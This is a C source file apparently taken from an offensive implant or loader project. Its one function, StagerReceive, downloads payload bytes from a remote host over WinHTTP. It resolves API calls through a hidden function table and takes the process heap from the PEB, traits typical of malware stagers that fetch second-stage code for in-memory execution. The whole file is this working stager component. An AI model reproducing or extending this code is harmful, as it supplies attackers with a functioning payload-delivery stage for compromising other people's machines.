#include <windows.h>
#include <winhttp.h>
#include <core/transport.h>
#include <core/win32.h>

void StagerReceive(INSTANCE pInstance, _In_ LPWSTR Host, _In_ int Port, _In_ LPWSTR Path, _Out_ PBYTE *ByteCodes, _Out_ DWORD *ByteSize) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    WCHAR wMethodRequest[] = L"GET";
    
    BOOL  bResults      = FALSE;
    DWORD dwSize       = 0;
    DWORD dwDownloaded = 0;
    BYTE* pTempBuffer  = NULL;

    PVOID Heap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;

    hSession = pInstance.Api.pWinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        goto END;
    }

    hConnect = pInstance.Api.pWinHttpConnect(hSession, Host, Port, 0);
    if (!hConnect) {
        goto END;
    }

    hRequest = pInstance.Api.pWinHttpOpenRequest(hConnect, wMethodRequest, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        goto END;
    }

    bResults = pInstance.Api.pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        goto END;
    }

    bResults = pInstance.Api.pWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        goto END;
    }

    DWORD dwContentLength = 0;
    DWORD dwSizeSize = sizeof(DWORD);
    bResults = pInstance.Api.pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentLength, &dwSizeSize, NULL);
    if (!bResults) {
        goto END;
    }

    pTempBuffer = (BYTE*)pInstance.Api.pRtlAllocateHeap(Heap, 0, dwContentLength);
    if (!pTempBuffer) {
        goto END;
    }

    do {
        bResults = pInstance.Api.pWinHttpReadData(hRequest, (LPVOID)(pTempBuffer + dwDownloaded), dwContentLength - dwDownloaded, &dwSize);
        if (bResults) {
            dwDownloaded += dwSize;
        } else {
            pInstance.Api.pRtlFreeHeap(Heap, 0, pTempBuffer);
            pTempBuffer = NULL; // Ensure pTempBuffer is NULL if allocation fails
            goto END;
        }
    } while (dwSize > 0 && dwDownloaded < dwContentLength);

    *ByteCodes = pTempBuffer;
    *ByteSize = dwContentLength;

END:
    if (hRequest) pInstance.Api.pWinHttpCloseHandle(hRequest);
    if (hConnect) pInstance.Api.pWinHttpCloseHandle(hConnect);
    if (hSession) pInstance.Api.pWinHttpCloseHandle(hSession);
}

